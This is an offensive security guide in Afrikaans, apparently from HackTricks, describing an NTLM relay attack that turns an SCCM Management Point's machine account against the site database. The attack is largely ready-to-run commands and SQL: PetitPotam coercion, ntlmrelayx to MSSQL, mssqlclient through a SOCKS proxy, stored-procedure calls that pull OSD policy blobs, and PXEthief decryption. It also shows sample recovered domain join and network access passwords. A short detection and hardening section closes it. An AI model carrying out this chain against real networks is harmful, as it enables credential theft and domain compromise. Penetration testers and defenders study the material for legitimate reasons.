# SCCM Bestuurspunt NTLM Relay na SQL – OSD Beleid Geheim Onttrekking

{{#include ../../banners/hacktricks-training.md}}

## TL;DR
Deur 'n **System Center Configuration Manager (SCCM) Bestuurspunt (MP)** te dwing om oor SMB/RPC te autentiseer en daardie NTLM masjienrekening na die **terrein databasis (MSSQL)** te **relay**, verkry jy `smsdbrole_MP` / `smsdbrole_MPUserSvc` regte. Hierdie rolle laat jou toe om 'n stel gestoor prosedures aan te roep wat **Operating System Deployment (OSD)** beleid blobs (Netwerk Toegang Rekening geloofsbriewe, Taak-Reeks veranderlikes, ens.) blootstel. Die blobs is hex-gecodeer/enkripteer, maar kan gedecodeer en ontsleutel word met **PXEthief**, wat platte teks geheime oplewer.

Hoofketting:
1. Ontdek MP & terrein DB ↦ ongeauthentiseerde HTTP eindpunt `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`.
2. Begin `ntlmrelayx.py -t mssql://<SiteDB> -ts -socks`.
3. Dwing MP met **PetitPotam**, PrinterBug, DFSCoerce, ens.
4. Deur die SOCKS-proxy te verbind met `mssqlclient.py -windows-auth` as die gerelayde **<DOMAIN>\\<MP-host>$** rekening.
5. Voer uit:
* `use CM_<SiteCode>`
* `exec MP_GetMachinePolicyAssignments N'<UnknownComputerGUID>',N''`
* `exec MP_GetPolicyBody N'<PolicyID>',N'<Version>'`   (of `MP_GetPolicyBodyAfterAuthorization`)
6. Verwyder `0xFFFE` BOM, `xxd -r -p` → XML  → `python3 pxethief.py 7 <hex>`.

Geheime soos `OSDJoinAccount/OSDJoinPassword`, `NetworkAccessUsername/Password`, ens. word herwin sonder om PXE of kliënte aan te raak.

---

## 1. Opname van ongeauthentiseerde MP eindpunte
Die MP ISAPI uitbreiding **GetAuth.dll** stel verskeie parameters bloot wat nie autentisering vereis nie (tenzij die terrein slegs PKI is):

| Parameter | Doel |
|-----------|---------|
| `MPKEYINFORMATIONMEDIA` | Retourneer terrein ondertekening sertifikaat publieke sleutel + GUIDs van *x86* / *x64* **Alle Onbekende Rekenings** toestelle. |
| `MPLIST` | Lys elke Bestuurspunt in die terrein. |
| `SITESIGNCERT` | Retourneer Primêre-Terrein ondertekening sertifikaat (identifiseer die terrein bediener sonder LDAP). |

Grijp die GUIDs wat as die **clientID** sal dien vir latere DB navrae:
```bash
curl http://MP01.contoso.local/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA | xmllint --format -
```
---

## 2. Stuur die MP masjienrekening na MSSQL
```bash
# 1. Start the relay listener (SMB→TDS)
ntlmrelayx.py -ts -t mssql://10.10.10.15 -socks -smb2support

# 2. Trigger authentication from the MP (PetitPotam example)
python3 PetitPotam.py 10.10.10.20 10.10.10.99 \
-u alice -p P@ssw0rd! -d CONTOSO -dc-ip 10.10.10.10
```
Wanneer die dwang afgaan, moet jy iets soos die volgende sien:
```
[*] Authenticating against mssql://10.10.10.15 as CONTOSO/MP01$ SUCCEED
[*] SOCKS: Adding CONTOSO/MP01$@10.10.10.15(1433)
```
---

## 3. Identifiseer OSD-beleide via gestoor prosedures
Verbind deur die SOCKS-proxy (poort 1080 standaard):
```bash
proxychains mssqlclient.py CONTOSO/MP01$@10.10.10.15 -windows-auth
```
Skakel oor na die **CM_<SiteCode>** DB (gebruik die 3-syfer terrein kode, bv. `CM_001`).

### 3.1  Vind Onbekende-Rekenaar GUIDs (opsioneel)
```sql
USE CM_001;
SELECT SMS_Unique_Identifier0
FROM dbo.UnknownSystem_DISC
WHERE DiscArchKey = 2; -- 2 = x64, 0 = x86
```
### 3.2  Lys toegewyde beleide
```sql
EXEC MP_GetMachinePolicyAssignments N'e9cd8c06-cc50-4b05-a4b2-9c9b5a51bbe7', N'';
```
Elke ry bevat `PolicyAssignmentID`, `Body` (hex), `PolicyID`, `PolicyVersion`.

Fokus op beleide:
* **NAAConfig**  – Netwerktoegangrekening krediete
* **TS_Sequence** – Taakvolgorde veranderlikes (OSDJoinAccount/Wagwoord)
* **CollectionSettings** – Kan run-as rekeninge bevat

### 3.3  Verkry volle liggaam
As jy reeds `PolicyID` & `PolicyVersion` het, kan jy die clientID vereiste oorslaan met:
```sql
EXEC MP_GetPolicyBody N'{083afd7a-b0be-4756-a4ce-c31825050325}', N'2.00';
```
> BELANGRIJK: Verhoog “Maximale Karakters Herwin” in SSMS (>65535) of die blob sal afgekort word.

---

## 4. Dekodeer & dekripteer die blob
```bash
# Remove the UTF-16 BOM, convert from hex → XML
echo 'fffe3c003f0078…' | xxd -r -p > policy.xml

# Decrypt with PXEthief (7 = decrypt attribute value)
python3 pxethief.py 7 $(xmlstarlet sel -t -v "//value/text()" policy.xml)
```
Herstelde geheime voorbeeld:
```
OSDJoinAccount : CONTOSO\\joiner
OSDJoinPassword: SuperSecret2025!
NetworkAccessUsername: CONTOSO\\SCCM_NAA
NetworkAccessPassword: P4ssw0rd123
```
---

## 5. Relevante SQL rolle & prosedures
By relay word die aanmelding toegeken aan:
* `smsdbrole_MP`
* `smsdbrole_MPUserSvc`

Hierdie rolle stel dosyne EXEC-toestemmings bloot, die sleutel wat in hierdie aanval gebruik word, is:

| Gestoor Prosedure | Doel |
|------------------|---------|
| `MP_GetMachinePolicyAssignments` | Lys beleid toegepas op 'n `clientID`. |
| `MP_GetPolicyBody` / `MP_GetPolicyBodyAfterAuthorization` | Retourneer volledige beleidsliggaam. |
| `MP_GetListOfMPsInSiteOSD` | Teruggestuur deur `MPKEYINFORMATIONMEDIA` pad. |

Jy kan die volledige lys inspekteer met:
```sql
SELECT pr.name
FROM   sys.database_principals AS dp
JOIN   sys.database_permissions AS pe ON pe.grantee_principal_id = dp.principal_id
JOIN   sys.objects AS pr ON pr.object_id = pe.major_id
WHERE  dp.name IN ('smsdbrole_MP','smsdbrole_MPUserSvc')
AND  pe.permission_name='EXECUTE';
```
---

## 6. Opsporing & Versterking
1. **Monitor MP aanmeldings** – enige MP rekenaarrekening wat aanmeld vanaf 'n IP wat nie sy gasheer is nie ≈ relay.
2. Aktiveer **Verlengde Beskerming vir Verifikasie (EPA)** op die webwerf databasis (`PREVENT-14`).
3. Deaktiveer ongebruikte NTLM, afdwing SMB ondertekening, beperk RPC (
dieselfde versagtings wat teen `PetitPotam`/`PrinterBug` gebruik is).
4. Versterk MP ↔ DB kommunikasie met IPSec / mutual-TLS.

---

## Sien ook
* NTLM relay beginsels:
{{#ref}}
../ntlm/README.md
{{#endref}}

* MSSQL misbruik & post-exploitatie:
{{#ref}}
abusing-ad-mssql.md
{{#endref}}



## Verwysings
- [I’d Like to Speak to Your Manager: Stealing Secrets with Management Point Relays](https://specterops.io/blog/2025/07/15/id-like-to-speak-to-your-manager-stealing-secrets-with-management-point-relays/)
- [PXEthief](https://github.com/MWR-CyberSec/PXEThief)
- [Misconfiguration Manager – ELEVATE-4 & ELEVATE-5](https://github.com/subat0mik/Misconfiguration-Manager)
{{#include ../../banners/hacktricks-training.md}}
